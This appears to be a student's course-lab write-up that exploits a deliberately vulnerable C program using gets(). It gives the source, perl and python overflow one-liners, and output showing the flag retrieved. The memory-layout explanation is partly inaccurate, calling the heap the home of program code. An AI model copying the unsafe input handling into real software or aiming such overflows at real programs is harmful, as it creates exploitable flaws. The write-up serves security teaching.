---
title: "Buffer Overflow - 1"
date: 2019-07-11T16:03:30+10:00

categories: ["Extended Security", "Musings"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

The nice course tutors decided to provide us some programs vulnerable to buffer overflow attacks - so let's have a play with them!

# Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void);
void doCheck(void);

int main(int argc, char** argv) {
	doCheck();
	return EXIT_SUCCESS;
}

void doCheck(void) {
    // turn off print buffering
        setbuf(stdout, NULL);
    // setup local variables
	char team = 'A';
	char name[32];

    // Print
	printf("Halt! Who goes there!\n");

    // get user input, save to array
	gets(&name);

    // jump to function
	printf("Let me see if you're on the list, %s...\n",name);
	if (team == 'B') {
		win();
	}

	return;
}

void win(void) {
	printf("We can leave this here, because it is never called.\n");
	printf("Our flag is safe.\n");

	printf("Flag: COMP6841{Hey_Look_Ma_I_Made_It!}\n");

	return;
}
```

# Analysis 

Search up the manual for `gets`. 
**Do it now.**

```bash
$> man 3 gets
GETS(3)    Linux Programmer's Manual    GETS(3)

NAME
       gets - get a string from standard input (DEPRECATED)

SYNOPSIS
       #include <stdio.h>

       char *gets(char *s);

DESCRIPTION
       Never use this function.
```

That's right, **never** use `gets`.  
The `gets` function is very elementary, and will blindly write data into memory. In other words, if we write 33 bytes in a 32 byte array, that extra byte will also be written - to somewhere probably undesirable.

And that's exactly what we do to perform a _buffer overflow attack_ - we overflow the buffer (ie an array).

In this program, the `name` array is 32 bytes long, and is positioned **before** the `team` character variable.  

_Hold on._  
But `name` was declared after `team` - why is it positioned _before_???

## Computer Memory

In the computer, our program memory is separated into two regions: the **stack** and the **heap**.  

The _stack_ (containing our runtime variables) is located at the end of the allocated memory - it expands by building downwards.  
The _heap_ (program code and static things) is located at the start of the allocated memory, and it builds up.

```
0x00000000                             0xFFFFFFFF
-------------------------------------------------
HEAP------->                         <------STACK
```

As the stack builds **downards**, newer variables are given a lower memory address, which is why `name` is at an address lower than `team`, despite it being defined after.

And this is important for our overflow attack!

```
         name (32 bytes)         team (1 byte)
------------------------------------------------
[                              ][ ]
```

By exploiting `gets`, if we write more than 32 bytes - _i.e. 33 bytes_ - into `name`, the extra byte will be written into team.

We want to overflow a 'B' character into `team`, so we just need to pass 32 dummy characters, then a 'B' into the input of the program.

```
$> perl -e 'print("\x00" x 32 . "B")' | ./basic

# Or if you want to use python
# python -c "print('\x00' * 32 + 'B')" | ./basic`

Halt! Who goes there!
Let me see if you're on the list, ...
We can leave this here, because it is never called.
Our flag is safe.
Flag: COMP6841{Hey_Look_Ma_I_Made_It!}
Segmentation fault
```

So we've successfully retreieved the flag `COMP6841{Hey_Look_Ma_I_Made_It!}`

It doesn't matter what data is used to fill in `name`.

---

# Note on 64-bit architecture

On an x64 machine, we actually need to write 47 bytes into the input before we can inject our 'B'.

`perl -e 'print(" " x 47 . "B")' | ./basic`

Why?

Supposedly this is a compatability thing for SIMD instructions that operate on 128 bits (16 bytes). So there is some padding between the data - supposedly.

```
$> compile basic --length 15 > /dev/null 2> /dev/null
$> perl -e 'print("B"x15 . "B")' | aslr ./basic
::main:: around 0x555555555185
  name   around 0x7fffffffe46c

[Memory up to &team]
42,42,42,42,42,42,42,42,
42,42,42,42,42,42,42,42,

Let me see if you're on the list, BBBBBBBBBBBBBBBB...

We can leave this here, because it is never called.
Our flag is safe.
Flag: COMP6841{Hey_Look_Ma_I_Made_It!}
```

```
$> compile basic --length 16 > /dev/null 2> /dev/null
$> perl -e 'print("B"x16 . "B")' | aslr ./basic
::main:: around 0x555555555185
  name   around 0x7fffffffe460

[Memory up to &team]
42,42,42,42,42,42,0,fffffffe,
fffffff7,ffffffff,7f,0,0,0,0,0,
41,

Let me see if you're on the list, BBBBBBBBBBBBBBBBB...
```

`compile` is a stub program to modify the length of the buffer array. Regardless, as you can see, by changing the length from `15` to `16`, there are 10 bytes separating the end of the array, and the address of `team`.



